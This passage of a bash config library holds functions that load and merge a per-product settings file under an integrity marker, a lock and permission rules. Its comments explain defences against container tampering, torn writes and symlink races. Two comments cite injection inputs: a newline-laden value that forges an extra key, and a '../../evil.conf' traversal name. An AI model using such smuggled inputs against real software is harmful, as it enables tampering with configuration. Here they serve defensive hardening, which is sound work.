# write torn at a line boundary leaves a file that parses perfectly and is missing every setting
# after the cut. Accepting that because "the body still parses" would silently revert a subset of
# settings to defaults with no report — the exact failure D60's fail-closed rule exists to prevent,
# and it would make the marker decorative. The accepted cost is that hand-editing this file is a
# two-step operation; `docs/CONFIG-FORMAT.md` publishes the recompute recipe.
#
# Reading NEVER rewrites the file: a read that re-blessed the marker would mutate without holding the
# lock and turn every status query into a write.
mi_conf_product_load() {
  # Arity before positional expansion — under `set -u` a short call would otherwise abort the CLI
  # with "unbound variable" instead of refusing in our own words.
  if [ "$#" -ne 2 ]; then
    mi_warn "config: mi_conf_product_load needs a <product> and a <spec>"; return 1
  fi
  local product="$1" spec="$2" f snap rc
  f="$(mi_conf_product_path "$product")" || return 1
  _mi_conf_identity_ok "$f" || return 1
  [ -f "$f" ] || return 3

  # SNAPSHOT ONCE, then run every check on the same bytes.
  #
  # This file is bind-mounted read-write into a container, which makes it the most exposed input in
  # the whole design: re-opening it for the marker check, then again for the byte gate, then again
  # for the parse is a TOCTOU a compromised container wins by simply rewriting the file between two
  # of those opens. It could pass the marker check with a good file and then be parsed as a torn,
  # markerless one that still happens to be syntactically valid — loading with rc 0 and defeating
  # D60's fail-closed rule outright. lib/ledger.sh closes exactly this window the same way; the
  # ledger is never mounted and this file is, so it needs the snapshot more, not less.
  #
  snap="$(_mi_conf_snap "$f")" || return 1
  # `if …; then …; else rc=$?; fi`, never a bare call followed by `rc=$?`. Under the entrypoint's
  # `set -e` a bare failing command exits the shell on the spot: the cleanup below would be skipped
  # (leaking the snapshot) AND, worse, this function would never RETURN 4 at all — the CLI would
  # simply die, so the torn-file contract every caller depends on would exist only on paper.
  if _mi_conf_snap_load "$snap" "$f" "$spec"; then rc=0; else rc=$?; fi
  rm -f "$snap"
  return "$rc"
}

# Merge KEY/VALUE pairs into a product's config. Requires the family lock.
#
# Pairs are ARGUMENTS, not records on stdin. A newline-delimited record stream cannot tell a newline
# INSIDE a caller's value from a deliberate second record, so `printf '%s\t%s\n' "$k" "$v"` with a
# value containing `\nOTHER_KEY\tvalue` would forge a key at the interface boundary — reintroducing
# exactly the D19 forgery the file format's rules close. An argument list has no framing to escape.
#
# MERGE, not replace. `*.conf` is user-owned (mi_zone), so D9 forbids destroying content this call
# did not create: comments, blank lines, key order and keys we were not asked to change all survive,
# the same way mi_conf_family_add treats mythical.conf. One mental model for both files.
#
# IN PLACE, never mktemp+mv. <product>.conf is bind-mounted as a SINGLE FILE, and a bind mount
# follows the inode: replacing it by rename detaches the container's view silently — the container
# keeps reading and writing the old inode forever, with no error on either side. §4.5 established
# this for the container's own writes; it binds the host writer for exactly the same reason.
#
# The residual is that an in-place write can tear (D60). It is mitigated, not eliminated: the whole
# body is built in memory and emitted by ONE redirection, the marker is written last, and the
# family lock serializes every host writer.
mi_conf_product_add() {
  # Arity BEFORE any positional expansion — under `set -u`, `local spec="$2"` on a short call aborts
  # the CLI with "unbound variable" rather than refusing in our own words.
  if [ "$#" -lt 5 ] || [ $(( ( $# - 3 ) % 2 )) -ne 0 ]; then
    mi_warn "config: mi_conf_product_add needs <product> <spec> <gid> and one or more KEY VALUE pairs"
    return 1
  fi
  local product="$1" spec="$2" gid="$3"; shift 3
  case "$gid" in ''|*[!0-9]*) mi_warn "config: '$gid' is not a numeric group id"; return 1 ;; esac
  # Resolve the path BEFORE asserting the lock, because resolving it is what VALIDATES the product
  # name. Asserted first, an unvalidated name is interpolated verbatim into the one message the design
  # calls the sole authorization refusal — "refusing to write ../../evil.conf without holding the
  # family lock". Nothing constructs a path from it, so that is cosmetic, but it is the wrong text in
  # the wrong message. Validating first costs nothing and hides nothing: mi_conf_product_path is a
  # pure function of its argument — no file access, no side effect — so this is the same
  # check-your-arguments-before-acting discipline every other function in this module follows.
  local f; f="$(mi_conf_product_path "$product")" || return 1
  mi_lock_assert_held "write ${product}.conf"
  _mi_conf_identity_ok "$f" || return 1

  # Validate EVERY pair before touching the file, so a rejected call leaves nothing behind.
  # Copy "$@" into an array and index THAT — not `eval "k=\${$i}"`. Indirect positional access via
  # eval is the traditional bash-3.2 idiom and it works, but reaching for eval inside the module
  # whose entire premise is "this code never evaluates data" is how that premise erodes.
  local -a args=("$@")
  local -a pk pv placed
  local i=0 k v type seen=""
  while [ "$i" -lt "${#args[@]}" ]; do
    k="${args[$i]}"; v="${args[$(( i + 1 ))]}"
    if ! _mi_conf_key_ok "$k"; then
      mi_warn "config: refusing to write invalid key name '$k' to ${product}.conf"; return 1
    fi
    if ! type="$(_mi_conf_spec_type "$spec" "$k")"; then
      mi_warn "config: $k is not a key ${product}.conf accepts"; return 1
    fi
    if ! _mi_conf_value_ok "$v" || ! _mi_conf_type_ok "$type" "$v"; then
      mi_warn "config: refusing to write an invalid value for $k"; return 1
    fi
    case "$seen" in
      *"|${k}|"*) mi_warn "config: $k given twice — refusing to write ${product}.conf"; return 1 ;;
    esac
    seen="${seen}|${k}|"
    pk[${#pk[@]}]="$k"; pv[${#pv[@]}]="$v"; placed[${#placed[@]}]=0
    i=$(( i + 2 ))
  done

  # An existing file must load cleanly before we merge into it. Merging into a torn or off-spec file
  # would re-bless damaged content with a fresh, valid-looking marker — turning a detectable problem
  # into an undetectable one. rc 4 (torn) is reported as such so the operator gets the right remedy.
  #
  # `if cmd; then rc=0; else rc=$?; fi` — NOT `if ! cmd; then rc=$?; fi`. Inside the then-branch of a
  # NEGATED condition, `$?` is the status of the `!` itself, which is 0 when the command failed. The
  # negated form therefore records success for every failure and falls through to write — silently
  # re-blessing a torn file with a fresh, valid-looking marker. Caught by running the code.
  # Take OUR OWN snapshot, validate it, and build the new body from THE SAME BYTES. Calling
  # mi_conf_product_load and then re-reading $f would validate one file and rewrite another: a
  # container that swaps the file in that gap gets its content hashed and re-blessed with a valid
  # marker by the host. Read once; never look at the live file again.
  # `line` used to be declared here too. It was a leftover from a `while read` loop this function no
  # longer has — shellcheck does not flag an unused bare `local`, so it had to go by hand.
  # `orig` and `had` serve the no-op check further down: `orig` is the pre-merge body and `had` says
  # we actually hold one, so "nothing changed" can be decided from bytes already in hand.
  local rc=0 existing="" snap="" body="" pre="" orig="" had=0
  if [ -e "$f" ]; then
    snap="$(_mi_conf_snap "$f")" || return 1
    if existing="$(_mi_conf_snap_load "$snap" "$f" "$spec" 2>/dev/null)"; then rc=0; else rc=$?; fi
    if [ "$rc" -ne 0 ]; then
      rm -f "$snap"
      mi_warn "config: ${product}.conf does not load cleanly — refusing to modify it; fix or remove it first"
      return "$rc"
    fi
    # Copy the existing body VERBATIM — every byte, comment and blank line, in order. `sed '$d'`
    # drops exactly ONE line, the marker, which _mi_conf_snap_load has already proved is the final
    # line. Done here, before the additive gate, so the snapshot is released on every path out.
    #
    # `$(cmd && printf X)`, not `< <(cmd)`. A process substitution's exit status is UNOBSERVABLE
    # (pipefail does not reach it), so a `sed` that died after emitting half its output would leave
    # the read loop reporting success — and the writer would then hash and write that truncated body
    # under a perfectly valid marker, turning a read failure into silent data loss on a user-owned
    # file. Chaining `&& printf X` makes the substitution's status sed's own, and the X is what
    # protects the trailing newlines that command substitution would otherwise strip.
    local raw
    if ! raw="$(sed '$d' "$snap" && printf X)"; then
      rm -f "$snap"
      mi_warn "config: cannot read the existing ${product}.conf — refusing to rewrite it"
      return 1
    fi
    body="${raw%X}"
    orig="$body"; had=1          # keep the PRE-MERGE body: the no-op check below compares against it
    # The snapshot is byte-identical to the file (it is under the size ceiling, or we refused), so
    # its digest is the file's digest as of the read. Captured before the snapshot is released.
    pre="$(mi_digest "$snap")" || { rm -f "$snap"; mi_warn "config: cannot digest the read buffer"; return 1; }
    rm -f "$snap"
  fi

  # ADDITIVE ONLY, exactly as mi_conf_family_add is and for the same D9 reason: a key already
  # present is either the operator's or the product UI's, and the installer cannot tell those from
  # its own earlier value. Same value ⇒ nothing to do; different value ⇒ refuse. Changing a setting
  # is D3's job (the product's UI writes the file directly) or Plan 4's compare-and-set.
  # Look the current values up in the records mi_conf_product_load already returned, NOT by calling
  # mi_conf_get on the file: the file still carries its trailing marker, which the scanner refuses.
  # Reusing the validated records also means the gate and the integrity check cannot disagree.
  local n=0 cur
  while [ "$n" -lt "${#pk[@]}" ]; do
    if cur="$(_mi_conf_record_value "$existing" "${pk[$n]}")"; then
      if [ "$cur" != "${pv[$n]}" ]; then
        mi_warn "config: ${pk[$n]} is already set to '$cur' in ${product}.conf — refusing to overwrite it"
        return 1
      fi
      placed[n]=1                      # already exactly right: keep the existing line untouched
    fi
    n=$(( n + 1 ))
  done

  n=0
  while [ "$n" -lt "${#pk[@]}" ]; do
    if [ "${placed[$n]}" -eq 0 ]; then body="${body}${pk[$n]}=${pv[$n]}"$'\n'; fi
    n=$(( n + 1 ))
  done

  local sum
  sum="$(printf '%s' "$body" | mi_digest /dev/stdin)" || { mi_warn "config: cannot compute the integrity marker"; return 1; }
  [ -n "$sum" ] || { mi_warn "config: empty integrity marker — refusing to write"; return 1; }

  # Compare-and-swap on the whole file, for the same reason as mi_conf_family_add: D3 explicitly
  # lets the product's UI write this file directly, and the family lock does not reach it. A UI save
  # landing between our snapshot and this write would be silently discarded. See residual 11.
  if ! _mi_conf_unchanged "$f" "$pre"; then
    mi_warn "config: ${product}.conf changed while we were reading it — refusing to overwrite that change; re-run"
    return 1
  fi

  # Re-check identity immediately before we MUTATE anything — which means before the create as well as
  # before the write. This check used to sit below the creation block, so the one mutating step it did
  # not cover was the create: a dangling symlink planted at $f just before it made this function
  # create a 0-byte file THROUGH the link, at a path of the attacker's choosing, and only then refuse.
  #
  # The check at the top of this function happened several reads ago, and a pathname check is only ever
  # true of the moment it ran: §4.1a records "pathname TOCTOU" as an ACCEPTED, irreducible residual for
  # a shell installer — "a property of checking a path and then using it", closable only with fd- or
  # mount-namespace-based I/O, which portable bash does not have. This does not close the window; it
  # makes it as small as the language allows across BOTH mutations, which is what §4.1a asks for. The
  # family lock already excludes every other mythical-ctl process, so the remaining racer is a local
  # process running as the operator.
  _mi_conf_identity_ok "$f" || return 1

  # Create the file at 0600 BEFORE any content lands, so a new file is never briefly world- or
  # group-readable at the process umask. Only for a file that does not exist yet: for an existing
  # one this would be a second write, widening the tear window for no gain.
  if [ ! -e "$f" ]; then
    if ! ( umask 077; : > "$f" ); then
      mi_warn "config: cannot create $f"; return 1
    fi
  fi

  # A pure CONTENT no-op does not touch the bytes. Re-installing means calling this with the values the
  # file already holds, so this is the ORDINARY path, not an edge case — and truncate-and-rewrite there
  # is a real cost for zero content change: the file is bind-mounted as a SINGLE FILE, so a
  # concurrently reading container can observe the truncated intermediate state. mi_conf_family_add
  # already returns before writing in this case; now both writers mean the same thing by "no-op
  # success".
  #
  # Decided from bytes we ALREADY HOLD, never by re-opening the live file — that would reintroduce the
  # content race this function is arranged to close, and the structural test forbids it. `orig` is the
  # snapshot's pre-merge body; when the merge appended nothing, `sum` is by construction the digest the
  # snapshot's own marker line already carried (_mi_conf_snap_load proved it matched), so body plus
  # marker is byte-for-byte the file that is already on disk.
  #
  # The chgrp/chmod below are deliberately NOT skipped. rc 5's documented repair is "sort the group out
  # and run again", and a retry's merge is a complete no-op — so skipping the ownership block here
  # would make rc 5 unrepairable.
  if [ "$had" -eq 1 ] && [ "$body" = "$orig" ]; then
    : # byte-identical: leave the bytes, the inode and the mtime exactly as they are
  # One redirection: truncate and write in a single open, so the tear window is as small as a
  # non-atomic write can be. The marker is last, so a crash leaves it stale rather than wrong.
  elif ! printf '%s%s%s\n' "$body" "$MI_CONF_MARKER_PREFIX" "$sum" > "$f"; then
    mi_warn "config: cannot write $f"; return 1
  fi

  # D60: owner=operator, 0660, group = the canonical family gid, applied NUMERICALLY.
  #
  # When chgrp FAILS this returns rc 5 — "written, but NOT to D60's spec" — never 0. The file is left
  # at 0600, because 0660 owned by the operator's PRIMARY group would grant unrelated local users
  # access while granting the container none: strictly worse than 0600 on both counts.
  #
  # rc 5 exists because reporting success here would be a lie with consequences: D3 makes the
  # product's UI the editor of its own settings, and without the group that UI cannot write the file
  # at all. The library states the fact and returns a distinguishable status; whether that is fatal
  # is the calling verb's decision (Plan 4), not a library default. See "Decisions" item 5 for the
  # gap in D60 this exposes.
  #
  # Both chmod failures below return 5, NOT 1, and the reason is the rc contract rather than taste. By
  # this point the bytes are COMMITTED — the content write has landed and the marker is valid — whereas
  # every other rc 1 in this module means "refused, and the file was left untouched". rc 5 is precisely
  # "written, but not to D60's spec", which is exactly what an unset mode is. Returning 1 here told a
  # Plan 4 caller keying on that documented distinction the opposite of the truth.
  if chgrp "$gid" "$f" 2>/dev/null; then
    if ! chmod 660 "$f"; then
      mi_warn "config: wrote $f and set the family group $gid, but could not set mode 0660 on it."
      return 5
    fi
    return 0
  fi
  if ! chmod 600 "$f"; then
    mi_warn "config: wrote $f, but could not set the family group $gid OR mode 0600 on it."
    return 5
  fi
  mi_warn "config: wrote $f, but could not set the family group $gid on it."
  mi_warn "  It is mode 0600. The product's own settings screen will be READ-ONLY until the group is set."
  return 5
}
